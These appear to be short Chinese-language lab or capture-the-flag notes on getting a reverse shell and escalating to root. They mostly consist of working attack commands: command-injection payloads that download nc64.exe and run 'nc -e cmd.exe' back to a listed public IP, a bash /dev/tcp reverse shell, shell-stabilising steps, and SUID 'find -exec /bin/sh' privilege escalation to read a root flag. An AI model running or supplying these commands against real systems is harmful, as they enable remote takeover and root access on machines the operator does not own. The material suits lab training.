反弹shell（权限）

为什么使用反向shell

  1. 防火墙绕过：
    • 企业防火墙通常允许出站连接，但阻止入站连接
    • 受害机器主动出站连接防火墙不会阻止
    • 攻击者监听端口需要处理NAT/防火墙（但这是攻击者的问题）
  2. NAT穿透
    • 受害机器在内网（如192.168.1.0/24）
    • 攻击者在公网
    • 受害机器可以主动连接到公网攻击者，反之则不行

前提：将kali中的nc传到目标机/靶机（即目标机中有nc）
前提步骤：0、kali root下有nc.exe文件
1、在kali中 python -m http.server
2、在靶机中 127.0.0.1|curl -o nc64.exe http://xxx.xxx.xxx.xxx:8000/nc64.exe
3、在kali nc -lvp 9999
4、在靶机中反弹shell 127.0.0.1|nc64.exe -e cmd.exe 39.105.61.146 9999

1、nc -nvlp 4444
2、bash -c ‘exec bash -i &>/dev/tcp/192.168.56.102/4444 <&1’(删除部分填自己kali的IP,蚂蚁剑部分)反弹无反应则检查shell是否存在，多尝试其他bash命令
3、python -c ‘import pty; pty.spawn(“/bin/bash”)’加固可以vim
4、ctrl +z
stty raw -echo;fg;reset



find会提权为root（如果提权失败就查看内核版本）
5、

    • find / -user root -perm -4000 -print 2>/dev/null
    • cd /tmp
    • touch 1
    • find /tmp -name 1 -exec “/bin/sh” ;
    • cd /root
    • ls
    • cat thefinalflag.txt
